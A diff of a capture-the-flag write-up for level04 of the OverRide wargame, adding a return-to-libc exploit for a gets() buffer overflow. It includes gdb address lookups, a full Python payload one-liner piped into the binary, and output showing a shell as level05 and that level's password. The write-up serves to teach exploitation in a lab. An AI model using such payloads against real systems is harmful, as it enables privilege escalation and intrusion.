@@ -33,7 +33,7 @@ Finally the child process is killed if it makes a syscall to exec().
 
 See [disassembly notes](https://github.com/anyashuka/Override/blob/main/level04/Ressources/disassembly_notes.md) for detailed gdb assembly breakdown.
 
-### Route to exploit
+### Find EIP offset
 
 The ```gets()``` call is vulnerable to buffer overflow, lets try to overflow and overwrite EIP, and so take control of the program.
 
@@ -52,12 +52,38 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 
 Program received signal SIGSEGV, Segmentation fault.
 [Switching to process 1701]
-0x41326641 in ?? ()   // EIP offset = 156 bytes
+0x41326641 in ?? ()               // EIP offset = 156 bytes
 ```
 
-However, if we try to insert a malicious shellcode which opens a shell the child process is killed.
+### Find libc addresses
+
+However, if we try to insert a malicious shellcode which opens a shell the child process is killed. So let's try a return-to-libc attack. First, we need the address of ```system()```, ```exit()``` & ```"/bin/sh"```.
+```
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) print exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+```
 
 ### Build exploit
+
+So we build our exploit string:
+1. 156 byte buffer - ```python -c "print 'A' * 156```
+2. system() address - ```\xd0\xae\xe6\xf7```
+3. exit() address - ```\x70\xeb\xe5\xf7```
+4. "/bin/sh" address - ```\xec\x97\xf8\xf7```
+
+Let's pipe our exploit string into the binary stdin.
+```
+level04@OverRide:~$ (python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'" ; cat) |./level04
+Give me some shellcode, k
+whoami
+level05
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+```
 
 ## Recreate Exploited Binary
 
